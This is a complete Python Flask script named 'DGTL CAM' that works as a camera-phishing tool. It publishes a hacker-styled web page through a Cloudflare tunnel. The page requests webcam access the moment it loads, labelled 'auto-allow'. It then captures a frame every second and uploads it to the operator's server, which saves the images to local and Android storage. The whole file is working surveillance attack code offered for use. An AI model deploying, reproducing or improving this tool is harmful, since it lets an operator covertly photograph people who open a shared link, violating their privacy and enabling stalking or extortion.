#!/usr/bin/env python3
"""
DGTL CAM - Fixed by Aryan Afridi
Working with Cloudflare Tunnel
"""

import os
import time
import threading
import base64
import socket
import subprocess
import signal
import atexit
from flask import Flask, render_template_string, request
from colorama import Fore, Style, init

# Initialize colorama for Windows support
init(autoreset=True)

app = Flask(__name__)

# ---------------- HTML Page (Hacker Theme) ----------------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DGTL CAM | HACKER TOOL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            font-family: 'Courier New', 'Monaco', 'Monospace', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
        }

        .container {
            background: rgba(0, 0, 0, 0.85);
            border-radius: 10px;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1);
            overflow: hidden;
            max-width: 550px;
            width: 100%;
            animation: glitch 0.5s ease-out;
            position: relative;
            z-index: 1;
            border: 1px solid #00ff00;
            backdrop-filter: blur(5px);
        }

        @keyframes glitch {
            0% {
                opacity: 0;
                transform: translateY(-30px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        @keyframes pulse {
            0%, 100% { text-shadow: 0 0 10px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
        }

        .header {
            background: linear-gradient(135deg, #003300 0%, #000000 100%);
            color: #00ff00;
            padding: 30px 20px;
            text-align: center;
            border-bottom: 2px solid #00ff00;
            position: relative;
        }

        .header::before {
            content: ">";
            position: absolute;
            left: 10px;
            top: 10px;
            color: #00ff00;
            animation: blink 1s infinite;
        }

        .header::after {
            content: "<";
            position: absolute;
            right: 10px;
            top: 10px;
            color: #00ff00;
            animation: blink 1s infinite;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 3px;
            animation: pulse 2s infinite;
        }

        .header p {
            opacity: 0.8;
            font-size: 12px;
            font-family: monospace;
        }

        .camera-section {
            padding: 20px;
            background: #000000;
        }

        .video-wrapper {
            background: #000;
            border-radius: 5px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            margin-bottom: 20px;
            position: relative;
            border: 1px solid #00ff00;
        }

        #video {
            width: 100%;
            height: auto;
            display: block;
            transform: scaleX(-1);
        }

        .status-card {
            background: #0a0a0a;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }

        .status-icon {
            width: 50px;
            height: 50px;
            border-radius: 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            margin-right: 15px;
            border: 1px solid #00ff00;
            background: #000;
        }

        .status-waiting {
            background: #0a0a0a;
            color: #ffff00;
            border-color: #ffff00;
        }

        .status-active {
            background: #0a0a0a;
            color: #00ff00;
            border-color: #00ff00;
        }

        .status-error {
            background: #0a0a0a;
            color: #ff0000;
            border-color: #ff0000;
        }

        .status-text {
            font-size: 14px;
            font-weight: 500;
            margin: 10px 0;
            font-family: monospace;
            color: #00ff00;
        }

        .capture-count {
            text-align: center;
            font-size: 12px;
            color: #00ff00;
            margin-top: 10px;
            font-family: monospace;
        }

        .footer {
            background: #0a0a0a;
            padding: 15px;
            text-align: center;
            font-size: 10px;
            color: #00ff00;
            border-top: 1px solid #00ff00;
            font-family: monospace;
        }

        .permission-btn {
            background: #000;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            font-family: monospace;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .permission-btn:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 20px #00ff00;
            transform: scale(1.05);
        }

        .badge {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 10px;
            font-family: monospace;
            border: 1px solid #00ff00;
        }
        
        .terminal-text {
            font-family: monospace;
            color: #00ff00;
        }

        .countdown {
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>
    
    <div class="countdown" id="countdown"></div>
    
    <div class="container">
        <div class="header">
            <h1>> DGTL CAM_</h1>
            <p># ARYAN AFRIDI OFFICIAL TOOL</p>
            <p># SECURE CAMERA ACCESS v3.0</p>
        </div>

        <div class="camera-section">
            <div class="video-wrapper">
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas" style="display:none;"></canvas>
                <div class="badge" id="cameraBadge">[ STATUS: OFFLINE ]</div>
            </div>

            <div class="status-card">
                <div style="display: flex; align-items: center;">
                    <div class="status-icon status-waiting" id="statusIcon">[?]</div>
                    <div>
                        <div class="status-text" id="statusText">> INITIALIZING CAMERA MODULE...</div>
                        <div class="capture-count" id="captureCount">> CAPTURED: 0 IMAGES</div>
                    </div>
                </div>
                <button class="permission-btn" id="requestBtn" onclick="requestCamera()" style="display:none;">[ ALLOW ACCESS ]</button>
            </div>
        </div>

        <div class="footer">
            <p>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
            <p>© 2026 DGTL CAM | ER ARYAN AFRIDI</p>
            <p>ENCRYPTED CONNECTION | SECURE STORAGE</p>
            <p>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
        </div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14;
        let columns = canvas.width / fontSize;
        let drops = [];
        
        for (let i = 0; i < columns; i++) {
            drops[i] = Math.random() * canvas.height / fontSize;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff00';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            columns = canvas.width / fontSize;
            drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.random() * canvas.height / fontSize;
            }
        });
        
        // Hacker Sound Effects (beep simulation)
        function playBeep() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                oscillator.frequency.value = 880;
                gainNode.gain.value = 0.1;
                
                oscillator.start();
                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.1);
                oscillator.stop(audioCtx.currentTime + 0.1);
            } catch(e) {
                console.log('Audio not supported');
            }
        }
        
        // Create background music using Web Audio API (Hacker style)
        function initBackgroundMusic() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const now = audioCtx.currentTime;
                
                function playTone(freq, start, duration, volume) {
                    const osc = audioCtx.createOscillator();
                    const gain = audioCtx.createGain();
                    osc.connect(gain);
                    gain.connect(audioCtx.destination);
                    osc.type = 'sine';
                    osc.frequency.value = freq;
                    gain.gain.value = volume;
                    osc.start(start);
                    gain.gain.exponentialRampToValueAtTime(0.00001, start + duration);
                    osc.stop(start + duration);
                }
                
                // Loop background music (hacker style)
                function playLoop() {
                    const time = audioCtx.currentTime;
                    playTone(440, time, 0.2, 0.05);
                    playTone(880, time + 0.3, 0.2, 0.05);
                    playTone(660, time + 0.6, 0.2, 0.05);
                    playTone(990, time + 0.9, 0.2, 0.05);
                    setTimeout(playLoop, 4000);
                }
                
                playLoop();
                audioCtx.resume();
            } catch(e) {
                console.log('Background music not supported');
            }
        }
        
        // Start music on first interaction
        document.body.addEventListener('click', () => {
            initBackgroundMusic();
        }, { once: true });
        
        let video = document.getElementById('video');
        let canvasEl = document.getElementById('canvas');
        let ctx2 = canvasEl.getContext('2d');
        let count = 0;
        let captureInterval = null;
        let stream = null;

        canvasEl.width = 640;
        canvasEl.height = 480;

        function updateStatus(type, message, countValue = null) {
            const statusIcon = document.getElementById('statusIcon');
            const statusText = document.getElementById('statusText');
            const captureCountDiv = document.getElementById('captureCount');
            const cameraBadge = document.getElementById('cameraBadge');

            if (type === 'waiting') {
                statusIcon.className = 'status-icon status-waiting';
                statusIcon.textContent = '[?]';
                statusText.textContent = message;
                cameraBadge.textContent = '[ STATUS: INITIALIZING ]';
                cameraBadge.style.borderColor = '#ffff00';
            } else if (type === 'active') {
                statusIcon.className = 'status-icon status-active';
                statusIcon.textContent = '[+]';
                statusText.textContent = message;
                cameraBadge.textContent = '[ STATUS: ACTIVE ]';
                cameraBadge.style.borderColor = '#00ff00';
            } else if (type === 'error') {
                statusIcon.className = 'status-icon status-error';
                statusIcon.textContent = '[!]';
                statusText.textContent = message;
                cameraBadge.textContent = '[ STATUS: ERROR ]';
                cameraBadge.style.borderColor = '#ff0000';
            }

            if (countValue !== null) {
                captureCountDiv.textContent = `> CAPTURED: ${countValue} IMAGES`;
            }
        }

        function captureImage() {
            if (!video.videoWidth || !video.videoHeight) return;
            
            ctx2.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);
            let data = canvasEl.toDataURL("image/png");
            
            fetch('/upload', { 
                method: 'POST', 
                body: data 
            }).then(response => {
                if (response.ok) {
                    count++;
                    updateStatus('active', '> CAPTURING IMAGES...', count);
                    playBeep();
                }
            }).catch(err => {
                console.error('Upload error:', err);
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(mediaStream => {
                stream = mediaStream;
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    updateStatus('active', '> CAMERA ACTIVE. CAPTURING SEQUENCE INITIATED...', count);
                    document.getElementById('requestBtn').style.display = 'none';
                    
                    if (captureInterval) clearInterval(captureInterval);
                    captureInterval = setInterval(() => {
                        captureImage();
                    }, 1000);
                };
            })
            .catch(err => {
                console.error('Camera error:', err);
                updateStatus('error', '> ERROR: CAMERA ACCESS DENIED. PERMISSION REQUIRED.');
                document.getElementById('requestBtn').style.display = 'block';
            });
        }

        function requestCamera() {
            count = 0;
            updateStatus('waiting', '> REQUESTING CAMERA PERMISSION...', 0);
            startCamera();
            playBeep();
        }

        // AUTO-ALLOW - INSTANT (NO DELAY)
        function autoAllowCamera() {
            console.log("%c[+] AUTO-ALLOW TRIGGERED - INSTANT ACCESS", "color: #00ff00; font-family: monospace;");
            // Immediately request camera - NO DELAY
            requestCamera();
        }

        // Start auto-allow IMMEDIATELY - NO WAITING
        autoAllowCamera();
        
        // Console hack message
        console.log("%cDGTL CAM Loaded | Hackers Colony", "color: #00ff00; font-size: 16px; font-family: monospace;");
        console.log("%c[+] Camera Module Initialized", "color: #00ff00; font-family: monospace;");
        console.log("%c[+] Secure Connection Established", "color: #00ff00; font-family: monospace;");
        console.log("%c[+] AUTO-ALLOW SYSTEM: INSTANT (0s DELAY)", "color: #00ff00; font-family: monospace;");
    </script>
</body>
</html>
"""

# ---------------- Global Variables ----------------
public_url = "No public URL"
local_ip = "127.0.0.1"
cloudflared_process = None
selected_port = 8090

# ---------------- Routes ----------------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/get_urls")
def get_urls():
    global public_url, local_ip, selected_port
    return {
        "public_url": public_url,
        "local_urls": {
            "localhost": f"http://localhost:{selected_port}",
            "network": f"http://{local_ip}:{selected_port}"
        }
    }

@app.route("/upload", methods=["POST"])
def upload():
    try:
        data = request.data.decode("utf-8")
        if not data or ',' not in data:
            return "error", 400
            
        imgdata = data.split(",")[1]
        
        # Local save
        timestamp = int(time.time() * 1000)
        filename_local = f"dgtl_cam_{timestamp}.png"
        with open(filename_local, "wb") as f:
            f.write(base64.b64decode(imgdata))
        
        # Gallery save for Android
        save_dir = "/sdcard/Download/DGTL-CAM"
        try:
            os.makedirs(save_dir, exist_ok=True)
            filename_gallery = os.path.join(save_dir, filename_local)
            with open(filename_gallery, "wb") as f:
                f.write(base64.b64decode(imgdata))
            
            # Media scan for Android
            os.system(f'am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://{filename_gallery} 2>/dev/null')
            print(Fore.GREEN + f"[✔] SAVED: {filename_gallery}" + Style.RESET_ALL)
        except:
            print(Fore.GREEN + f"[✔] SAVED LOCALLY: {filename_local}" + Style.RESET_ALL)
        
        return "ok"
    except Exception as e:
        print(Fore.RED + f"[✘] ERROR: {e}" + Style.RESET_ALL)
        return "error", 500

# ---------------- Banner ----------------
def show_banner():
    banner_text = """
\033[1;31m██████╗  ██████╗ ████████╗██╗         \033[1;34m ██████╗ █████╗ ███╗   ███╗\033[0m
\033[1;33m██╔══██╗██╔════╝ ╚══██╔══╝██║         \033[1;35m██╔════╝██╔══██╗████╗ ████║\033[0m
\033[1;32m██║  ██║██║  ███╗   ██║   ██║         \033[1;36m██║     ███████║██╔████╔██║\033[0m
\033[1;33m██║  ██║██║   ██║   ██║   ██║         \033[1;34m██║     ██╔══██║██║╚██╔╝██║\033[0m
\033[1;31m██████╔╝╚██████╔╝   ██║   ███████╗    \033[1;35m╚██████╗██║  ██║██║ ╚═╝ ██║\033[0m
\033[1;32m╚═════╝  ╚═════╝    ╚═╝   ╚══════╝    \033[1;36m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝\033[0m

\033[1;33m🔴 YouTube Channel:\033[0m \033[1;36mhttps://www.youtube.com/@aryanafridi00\033[0m
\033[1;34m🌐 GitHub:\033[0m \033[1;36mhttps://github.com/shahid2005a\033[0m
\033[1;35m💻 Developer:\033[0m \033[1;32mARYAN AFRIDI\033[0m
"""
    print(banner_text)
    print("\n")
    print(Fore.CYAN + "[⚡] DGTL CAM - ADVANCED SECURITY TOOL" + Style.RESET_ALL)
    print(Fore.CYAN + "[⚡] AUTO-ALLOW SYSTEM: INSTANT (0s DELAY)" + Style.RESET_ALL)
    print(Fore.CYAN + "[⚡] CAMERA WILL AUTO-START IMMEDIATELY" + Style.RESET_ALL)
    print(Fore.CYAN + "[⚡] CLOUDFLARE TUNNEL: PORT 8090" + Style.RESET_ALL)
    print("\n")

# ---------------- Local Network IP ----------------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ---------------- Check Cloudflared ----------------
def check_cloudflared():
    """Check if cloudflared is installed"""
    try:
        subprocess.run(["cloudflared", "--version"], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

# ---------------- Start Cloudflared Tunnel ----------------
def start_cloudflared():
    global public_url, cloudflared_process, selected_port
    
    print(Fore.YELLOW + "\n[!] STARTING CLOUDFLARE TUNNEL..." + Style.RESET_ALL)
    print(Fore.CYAN + f"[!] COMMAND: cloudflared tunnel --url http://127.0.0.1:{selected_port}" + Style.RESET_ALL)
    
    if not check_cloudflared():
        print(Fore.RED + "[✘] CLOUDFLARED NOT FOUND!" + Style.RESET_ALL)
        print(Fore.CYAN + "\n📥 INSTALLATION:" + Style.RESET_ALL)
        print(Fore.WHITE + "   TERMUX: pkg install cloudflared" + Style.RESET_ALL)
        print(Fore.RED + "\n[!] PUBLIC URL NOT AVAILABLE" + Style.RESET_ALL)
        return
    
    try:
        print(Fore.GREEN + "[✓] CLOUDFLARED FOUND" + Style.RESET_ALL)
        
        # Start cloudflared tunnel with exact command
        cloudflared_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{selected_port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(3)
        
        for _ in range(20):
            if cloudflared_process.poll() is not None:
                break
            
            if cloudflared_process.stderr:
                lines = cloudflared_process.stderr.readlines()
                for line in lines:
                    if "https://" in line:
                        words = line.split()
                        for word in words:
                            if word.startswith("https://") and (".trycloudflare.com" in word or ".cfargotunnel.com" in word):
                                public_url = word.strip()
                                print(Fore.GREEN + f"\n✅ TUNNEL ACTIVE!" + Style.RESET_ALL)
                                print(Fore.GREEN + f"🌍 PUBLIC URL: {public_url}" + Style.RESET_ALL)
                                print(Fore.CYAN + f"🔗 COMMAND USED: cloudflared tunnel --url http://127.0.0.1:{selected_port}" + Style.RESET_ALL)
                                return
            
            time.sleep(0.5)
        
        if public_url == "No public URL":
            print(Fore.RED + "[✘] COULD NOT DETECT URL" + Style.RESET_ALL)
            print(Fore.YELLOW + "[!] TRY MANUALLY: cloudflared tunnel --url http://127.0.0.1:" + str(selected_port) + Style.RESET_ALL)
            
    except Exception as e:
        print(Fore.RED + f"[✘] ERROR: {e}" + Style.RESET_ALL)

def cleanup_cloudflared():
    global cloudflared_process
    if cloudflared_process:
        print(Fore.YELLOW + "\n[!] STOPPING TUNNEL..." + Style.RESET_ALL)
        cloudflared_process.terminate()
        time.sleep(1)
        if cloudflared_process.poll() is None:
            cloudflared_process.kill()

# ---------------- Find Available Port ----------------
def find_available_port(start_port=8090):
    port = start_port
    while port < start_port + 100:
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(("0.0.0.0", port))
            test_socket.close()
            return port
        except OSError:
            port += 1
    return start_port

# ---------------- Main ----------------
if __name__ == "__main__":
    show_banner()
    
    local_ip = get_local_ip()
    selected_port = find_available_port(8090)
    
    print(Fore.GREEN + f"\n{'='*60}" + Style.RESET_ALL)
    print(Fore.GREEN + "✅ DGTL CAM INITIALIZED" + Style.RESET_ALL)
    print(Fore.GREEN + f"📍 LOCAL URL: http://localhost:{selected_port}" + Style.RESET_ALL)
    print(Fore.GREEN + f"📍 NETWORK URL: http://{local_ip}:{selected_port}" + Style.RESET_ALL)
    print(Fore.GREEN + f"{'='*60}" + Style.RESET_ALL)
    print(Fore.CYAN + f"\n🚀 CLOUDFLARE COMMAND: cloudflared tunnel --url http://127.0.0.1:{selected_port}" + Style.RESET_ALL)
    print(Fore.GREEN + f"\n{'='*60}\n" + Style.RESET_ALL)
    
    # Start Cloudflare tunnel
    cloudflare_thread = threading.Thread(target=start_cloudflared, daemon=True)
    cloudflare_thread.start()
    
    # Register cleanup
    atexit.register(cleanup_cloudflared)
    signal.signal(signal.SIGINT, lambda sig, frame: cleanup_cloudflared())
    
    # Run Flask
    app.run(host="0.0.0.0", port=selected_port, debug=False, use_reloader=False)